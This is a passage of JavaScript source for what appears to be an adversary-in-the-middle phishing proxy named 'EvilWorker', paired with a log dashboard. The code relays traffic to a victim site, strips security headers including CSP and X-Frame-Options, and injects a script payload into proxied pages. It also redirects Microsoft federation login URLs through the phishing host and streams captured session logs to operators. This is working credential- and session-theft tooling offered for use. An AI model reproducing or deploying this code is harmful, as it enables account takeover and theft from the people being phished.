                validDomains.push(validDomain);
            }
        }
    }
    return validDomains;
}

function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHostname) {
    const azureHTTPRequestHeaders = [
        "max-forwards",
        "x-arr-log-id",
        "client-ip",
        "disguised-host",
        "x-site-deployment-id",
        "was-default-hostname",
        "x-forwarded-proto",
        "x-appservice-proto",
        "x-arr-ssl",
        "x-forwarded-tlsversion",
        "x-forwarded-for",
        "x-original-url",
        "x-waws-unencoded-url",
        "x-client-ip",
        "x-client-port"
    ];

    const proxyRequestCookies = prepareProxyRequestCookies(proxyRequestOptions, currentSession, proxyHostname);
    if (Object.keys(proxyRequestCookies).length) {
        proxyRequestOptions.headers.cookie = proxyRequestCookies;
    }
    else {
        delete proxyRequestOptions.headers.cookie;
    }

    if (proxyRequestOptions.headers.origin) {
        proxyRequestOptions.headers.origin = `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}`;
    }
    if (proxyRequestOptions.headers.hasOwnProperty("referer") &&
        (!proxyRequestOptions.headers.referer || proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT))) {
        delete proxyRequestOptions.headers.referer;
    }

    for (const [key, value] of Object.entries(proxyRequestOptions.headers)) {
        if (azureHTTPRequestHeaders.includes(key)) {
            delete proxyRequestOptions.headers[key];
        }
        else {
            proxyRequestOptions.headers[key] = value.replaceAll(proxyHostname, VICTIM_SESSIONS[currentSession].host);
        }
    }
}

function deleteHTTPSecurityResponseHeaders(headers) {
    const httpSecurityResponseHeaders = [
        "x-frame-options",
        "x-xss-protection",
        "x-content-type-options",
        "set-cookie",
        "content-security-policy",
        "content-security-policy-report-only",
        "cross-origin-opener-policy",
        "cross-origin-embedder-policy",
        "cross-origin-resource-policy",
        "permissions-policy",
        "service-worker-allowed"
    ];

    for (const header of httpSecurityResponseHeaders) {
        delete headers[header];
    }
}

function decompressData(compressedData, encoding) {
    const decompressionAlgorithms = {
        gzip: zlib.gunzip,
        "x-gzip": zlib.gunzip,
        deflate: zlib.inflate,
        br: zlib.brotliDecompress,
        zstd: zlib.zstdDecompress
    };

    return new Promise((resolve, reject) => {
        const decompressionAlgorithm = decompressionAlgorithms[encoding];

        if (decompressionAlgorithm) {
            decompressionAlgorithm(compressedData, (error, decompressedData) => {
                if (error) reject(error);
                else resolve(decompressedData);
            });
        }
        else {
            resolve(compressedData);
        }
    });
}

function compressData(decompressedData, encoding) {
    const compressionAlgorithms = {
        gzip: zlib.gzip,
        "x-gzip": zlib.gzip,
        deflate: zlib.deflate,
        br: zlib.brotliCompress,
        zstd: zlib.zstdCompress
    };

    return new Promise((resolve, reject) => {
        const compressionAlgorithm = compressionAlgorithms[encoding];

        if (compressionAlgorithm) {
            compressionAlgorithm(decompressedData, (error, compressedData) => {
                if (error) reject(error);
                else resolve(compressedData);
            });
        }
        else {
            resolve(decompressedData);
        }
    });
}

async function decompressResponseBody(compressedData, contentEncoding) {
    if (!contentEncoding) {
        return {
            decompressedResponseBody: compressedData,
            encodings: []
        };
    }

    const encodings = contentEncoding.split(",")
        .map(encoding => encoding.trim().toLowerCase())
        .filter(encoding => encoding);

    let decompressedData = compressedData;
    for (let i = encodings.length - 1; i >= 0; i--) {
        decompressedData = await decompressData(decompressedData, encodings[i]);
    }
    return {
        decompressedResponseBody: decompressedData,
        encodings: encodings
    };
}

async function compressResponseBody(decompressedData, encodings) {
    let compressedData = decompressedData;

    for (const encoding of encodings) {
        compressedData = await compressData(compressedData, encoding);
    }
    return compressedData;
}

function updateHTMLProxyResponse(decompressedResponseBody) {
    const payload = "<script src=/@></script>";
    const htmlInjectionMap = {
        "<head>": `<head>${payload}`,
        "<html>": `<html><head>${payload}</head>`,
        "<body>": `<head>${payload}</head><body>`
    };
    const indexLimit = 200;

    for (const [key, value] of Object.entries(htmlInjectionMap)) {
        const htmlTagBuffer = Buffer.from(key);
        const injectionPointIndex = decompressedResponseBody.subarray(0, indexLimit).indexOf(htmlTagBuffer);

        if (injectionPointIndex !== -1) {
            return Buffer.concat([
                decompressedResponseBody.subarray(0, injectionPointIndex),
                Buffer.from(value),
                decompressedResponseBody.subarray(injectionPointIndex + htmlTagBuffer.byteLength)
            ]);
        }
    }
    return Buffer.concat([
        Buffer.from(`<head>${payload}</head>`),
        decompressedResponseBody
    ]);
}

function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
    const decompressedResponseBodyString = decompressedResponseBody.toString();
    const decompressedResponseBodyObject = JSON.parse(decompressedResponseBodyString);
    const federationRedirectUrl = decompressedResponseBodyObject.Credentials.FederationRedirectUrl;

    const proxyRequestURL = new URL(`https://${proxyHostname}${PROXY_PATHNAMES.mutation}`);
    proxyRequestURL.searchParams.append(PHISHED_URL_PARAMETER, encodeURIComponent(federationRedirectUrl));
    
    decompressedResponseBodyObject.Credentials.FederationRedirectUrl = proxyRequestURL;
    return Buffer.from(JSON.stringify(decompressedResponseBodyObject));
}

// ================================================
// 𝚂𝚃𝙰𝚁𝚃 𝙱𝙾𝚃𝙷 𝙾𝙽 𝚃𝙷𝙴 𝚂𝙰𝙼𝙴 𝙿𝙾𝚁𝚃
// ================================================

const app = express();

app.use('/dash', dashApp);

app.use((req, res) => {
    if (!req.path.startsWith('/dash')) {
        proxyServer.emit('request', req, res);
    }
});

const PORT = process.env.PORT || 3000;

const server = app.listen(PORT, () => {
    console.log(`✅ EvilWorker Proxy + PHANTOM Dashboard running on port ${PORT}`);
    console.log(`🔐 Dashboard: /dash (auth: ${dashUser}/${dashPass})`);
});

const wss = new WebSocket.Server({ server });
let clients = [];
wss.on('connection', (ws) => {
    clients.push(ws);
    ws.on('close', () => {
        clients = clients.filter(c => c !== ws);
    });
});

try {
    fs.watch(LOGS_DIRECTORY, (eventType, filename) => {
        if (filename && filename.endsWith('.log')) {
            clients.forEach(client => {
                if (client.readyState === WebSocket.OPEN) {
                    client.send(JSON.stringify({ type: 'newLog', file: filename }));
                }
            });
        }
    });
} catch (err) {
    console.warn('⚠️ File watching not available. Frontend will poll.');
}
